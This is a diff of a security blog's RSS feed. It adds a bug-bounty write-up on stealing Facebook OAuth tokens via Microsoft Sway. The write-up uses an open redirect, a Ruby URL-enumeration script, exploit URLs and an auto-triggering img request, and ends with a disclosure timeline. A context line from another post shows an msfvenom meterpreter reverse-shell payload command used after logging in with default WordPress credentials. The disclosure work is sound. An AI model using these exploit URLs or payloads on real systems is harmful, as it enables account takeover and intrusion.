@@ -6,9 +6,125 @@
     <atom:link href="https://r0rshark.github.io/feed.xml" rel="self" type="application/rss+xml" />
     <description></description>
     <language>en-us</language>
-    <pubDate>Thu, 30 Jul 2015 12:40:17 +0000</pubDate>
-    <lastBuildDate>Thu, 30 Jul 2015 12:40:17 +0000</lastBuildDate>
+    <pubDate>Tue, 08 Sep 2015 13:11:54 +0000</pubDate>
+    <lastBuildDate>Tue, 08 Sep 2015 13:11:54 +0000</lastBuildDate>
 
+    
+    
+    <item>
+      <title>Stealing OAuth tokens in Microsoft Sway application</title>
+      <link>https://r0rshark.github.io/2015/09/06/microsoft/</link>
+      <pubDate>Sun, 06 Sep 2015 00:00:00 +0000</pubDate>
+      <author></author>
+      <guid>https://r0rshark.github.io/2015/09/06/microsoft</guid>
+      <description>&lt;h3 id=&quot;tldr&quot;&gt;TL;DR&lt;/h3&gt;
+&lt;p&gt;The Connect with Facebook functionality of Microsoft is vulnerable to the OAuth token stealing attack.
+The &lt;code&gt;redirect_uri&lt;/code&gt; parameter can be modified by the attacker making the Facebook OAuth token leak to a domain not controlled by Microsoft and in this way steal user private information accessible through the token.&lt;/p&gt;
+
+&lt;h3 id=&quot;oauth-guide&quot;&gt;OAUTH GUIDE&lt;/h3&gt;
+
+&lt;p&gt;A basic undestanding of the OAuth flow is useful to better understand this post, a very good guide can be found &lt;a href=&quot;https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2&quot;&gt;here&lt;/a&gt;. When reading the guide focus the attention on “Grant Type: Authorization Code” and the “Grant Type: Implicit” which are by far the most common approaches.&lt;/p&gt;
+
+&lt;h3 id=&quot;probing-for-wide-redirecturi&quot;&gt;PROBING FOR WIDE REDIRECT_URI&lt;/h3&gt;
+&lt;p&gt;The &lt;code&gt;redirect_uri&lt;/code&gt; parameter is very important because it represents the url to which the authorization_code/access_token (based on Grant Type) is sent. If we are able to change the value of the &lt;code&gt;redirect_uri&lt;/code&gt; and not to make the OAuth flow to fail (because of authenticity checks on the &lt;code&gt;redirect_uri&lt;/code&gt;) we could leak the token/code to a domain controlled by us.
+Original request:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;redirect_uri=&lt;/code&gt;&lt;strong&gt;https://profile.live.com/cid-847183e5db31faa2/services&lt;/strong&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;scope=user_photos&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Possible redirect_url:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Completely different domain&lt;/strong&gt;:  redirect_uri=&lt;code&gt;https://attacker.com&lt;/code&gt;;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Different subdomain&lt;/strong&gt;: redirect_uri=https://&lt;code&gt;xxx.live.com&lt;/code&gt;/cid-847183e5db31faa2/services;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Different folder&lt;/strong&gt;: redirect_uri= https://profile.live.com&lt;code&gt;/xxx&lt;/code&gt;;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The use of a completely different domain is very unlikely to work while in some cases the use of a different folder or subdomain is allowed. Our current payload is:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?client_id=441348565910475&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;redirect_uri=&lt;/code&gt;&lt;strong&gt;https://xxx.live.com/xxx&lt;/strong&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;scope=user_photos&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;searching-for-open-redirect&quot;&gt;SEARCHING FOR OPEN REDIRECT&lt;/h3&gt;
+&lt;p&gt;The ability to leak the the token/code to a different subdomain/folder is not useful per se, however it will provide to the attacker &lt;strong&gt;a wider attack surface&lt;/strong&gt; to find an Open Redirect. An Open Redirect endpoint is a url which redirects the user to a parameter value without any validation. The idea is to &lt;strong&gt;find an Open Redirect in *.live.com/*&lt;/strong&gt; which would leak the token to a domain that we can control.&lt;/p&gt;
+
+&lt;p&gt;After some google dorking I have noticed that the endpoint:
+  &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/\&amp;lt;number\&amp;gt;&lt;/code&gt; issues a 302 Redirect to external domains based on  &lt;code&gt;\&amp;lt;number\&amp;gt;&lt;/code&gt;.&lt;br /&gt;
+For example &lt;code&gt;g.live.com/0HE_TRACKSTAR_ENUS9/1&lt;/code&gt;&lt;br /&gt;
+redirects to &lt;code&gt;http://www.msn.com/it-it/&lt;/code&gt;&lt;br /&gt;
+Through a 30 line of ruby script I have enumerated the possible domains to which I could leak the token&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;net/http&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;uri&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;cgi&amp;#39;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;url_brute.rb &amp;lt;url to bruteforce&amp;gt; &amp;lt;start number&amp;gt; &amp;lt;end number&amp;gt; &amp;lt;file where to write&amp;gt;&amp;quot;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ending&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ARGV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ending&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Net&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;begin&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Location&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;rescue&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; Timeout&amp;quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_url&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Among these domains there are some which can be purchased like g.live.com/0HE_TRACKSTAR_CSCZ9/75011 which redirects to http://staysafe.org/.
+Making the  user issue a GET request to &lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;amp;display=popup&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&lt;/code&gt; will leak the token/code to http://staysafe.org/.&lt;/p&gt;
+
+&lt;h3 id=&quot;changing-the-flow&quot;&gt;CHANGING THE FLOW&lt;/h3&gt;
+&lt;p&gt;Referencing to the guide that I have pointed out before the &lt;code&gt;Grant Type&lt;/code&gt; used by Microsoft is the &lt;code&gt;Authorization Code&lt;/code&gt; one. Using the exploit we can leak the &lt;code&gt;Authorization Code&lt;/code&gt; but in order to access the protected information we need to exchange the &lt;code&gt;Authorization code&lt;/code&gt; with the &lt;code&gt;Access Token&lt;/code&gt;. However in order to do this we need to know the &lt;code&gt;client secret&lt;/code&gt; which we aren’t able to get since it is stored on the Microsoft servers. In order to bypass this limitation we can change &lt;code&gt;Grant Type&lt;/code&gt; to the Implicit one which directly provides the &lt;code&gt;Access Token&lt;/code&gt; to the url in the redirect_url field.
+With the Facebook SDK this can be done by &lt;strong&gt;adding the parameter response_type=token&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;stealing-the-token&quot;&gt;STEALING THE TOKEN&lt;/h3&gt;
+&lt;p&gt;An attaker could:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Purchased the domain &lt;code&gt;http://staysafe.org/&lt;/code&gt;;&lt;/li&gt;
+  &lt;li&gt;Insert a small javascript script at staysafe.org to get the window.location.hash and parse it to &lt;code&gt;extract the token&lt;/code&gt;;&lt;/li&gt;
+  &lt;li&gt;Make the victim issue a GET request to &lt;code&gt;https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=http://g.live.com/0HE_TRACKSTAR_CSCZ9/75011&amp;amp;display=popup&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;&amp;amp;scope=user_photos+user_videos&amp;amp;client_id=441348565910475&amp;amp;ret=login&amp;amp;response_type=token&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;trigger-the-exploit-without-interaction&quot;&gt;TRIGGER THE EXPLOIT WITHOUT INTERACTION&lt;/h3&gt;
+&lt;p&gt;The Connect with Facebook functionality can be used in the Microsoft Sway application where I found a second vulnerability which would allow an attaker to make the user issue arbitrary GET requests by just viewing a “sway”.
+This is possible because, crafting a particular request in the Add image functionality, an attacker is able to persistently control the src attribute of an img tag. I tried to exploit this kind of vulnerability to get an XSS however the quotes were escaped and the &lt;code&gt;javascript:alert(1)&lt;/code&gt; payload in the img src attribute doesn’t work in the modern browsers. However we can use this vulnerability to automatically make the user issue our “exploit GET request” triggering our exploit as soon as he view a maliciously crafted “sway”.&lt;/p&gt;
+
+&lt;div class=&quot;full zoomable&quot;&gt;
+  &lt;img src=&quot;/images/microsoft/sway_poc.png&quot; /&gt;
+&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;15 May 2015 Vulnerability reported to the Microsoft Security Team&lt;/li&gt;
+  &lt;li&gt;4 August 2015 Vulnerability patched&lt;/li&gt;
+  &lt;li&gt;25 August 2015 Got reward of $1000&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+    </item>
+    
     
     
     <item>
@@ -29,7 +145,8 @@ Since the bugs are often located in hidden and old pages of the website let’s 
 &lt;/div&gt;
 
 &lt;h3 id=&quot;the-wordpress-test-blog&quot;&gt;The Wordpress test blog&lt;/h3&gt;
-&lt;p&gt;The first thing that I have noticed was the title of the blog  &lt;strong&gt;Test | Just another WordPress site - Adometry&lt;/strong&gt; which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: &lt;strong&gt;Test&lt;/strong&gt; that in many case means vulnerable as hell. The second thing that I have noticed is that the url of this blog &lt;a href=&quot;http://www.adometry.com/blog2013/&quot;&gt;http://www.adometry.com/blog2013/&lt;/a&gt; is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the &lt;strong&gt;Wordpress version was the 3.5.1&lt;/strong&gt; that has a lot of vulnerabilities like XSS XXE CSRF and maybe a &lt;a href=&quot;https://vagosec.org/2013/12/wordpress-rce-exploit/&quot;&gt;RCE&lt;/a&gt;, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the &lt;strong&gt;classical credetials&lt;/strong&gt; for a testing thing? The default ones and in the case of Wordpress the classical &lt;strong&gt;admin:admin&lt;/strong&gt;. Let’s give them a shot and here we are:&lt;/p&gt;
+&lt;p&gt;The first thing that I have noticed was the title of the blog  &lt;strong&gt;Test | Just another WordPress site - Adometry&lt;/strong&gt; which contains the magic keyword that every Penetration Tester/Bug Hunter is looking for: &lt;strong&gt;Test&lt;/strong&gt; that in many cases means vulnerable as hell. The second thing that I have noticed is that the url of this blog &lt;a href=&quot;http://www.adometry.com/blog2013/&quot;&gt;http://www.adometry.com/blog2013/&lt;/a&gt; is different from the official one that I have discovered before. By inspecting the source code of the page I discovered that the &lt;strong&gt;Wordpress version was the 3.5.1&lt;/strong&gt; that has a lot of vulnerabilities like XSS XXE CSRF and maybe a &lt;a href=&quot;https://vagosec.org/2013/12/wordpress-rce-exploit/&quot;&gt;RCE&lt;/a&gt;, but  I am a lazy guy, out there it was very hot, and I would like to go for a swim so I tryed to find an easier way in. I know for sure this was just a testing blog and so what are the &lt;strong&gt;classical credetials&lt;/strong&gt; for a testing thing? The default ones and in the case of Wordpress the classical &lt;strong&gt;admin:admin&lt;/strong&gt;. Let’s give them a shot and here we are:&lt;/p&gt;
+
 &lt;div class=&quot;full zoomable&quot;&gt;
   &lt;img src=&quot;/images/google/wordpress.png&quot; /&gt;
 &lt;/div&gt;
@@ -69,6 +186,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=Your IP LPORT=Your Port -f raw &am
 &lt;ul&gt;
   &lt;li&gt;&lt;strong&gt;Upload and enable the plugin&lt;/strong&gt; in the Wordpress dashboard&lt;/li&gt;
 &lt;/ul&gt;
+
 &lt;div class=&quot;full zoomable&quot;&gt;
   &lt;img src=&quot;/images/google/wordpress_plugin.png&quot; /&gt;
 &lt;/div&gt;
